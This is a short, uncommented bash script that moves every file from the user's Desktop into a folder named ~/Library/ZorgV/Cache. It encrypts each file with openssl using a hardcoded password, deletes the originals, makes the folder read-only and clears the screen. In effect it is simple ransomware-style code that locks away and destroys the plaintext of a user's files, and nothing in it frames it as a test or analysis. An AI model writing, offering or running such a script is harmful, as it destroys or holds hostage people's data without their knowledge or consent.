#!/bin/bash

DIR="./Library/ZorgV/Cache"
PASSWORD="1234"
mv ~/Desktop/* ~/Library/ZorgV/Cache/
find "$DIR" -type f ! -name "*.encrypted" | while read -r file; do
    enc_file="${file}.encrypted"
    openssl enc -aes-256-cbc -salt -in "$file" -out "$enc_file" -pass pass:"$PASSWORD"
    echo "Encrypted: $file → $enc_file"
    rm -f "$file"
    echo "Deleted original file: $file"
done
chmod -w "$DIR"
clear

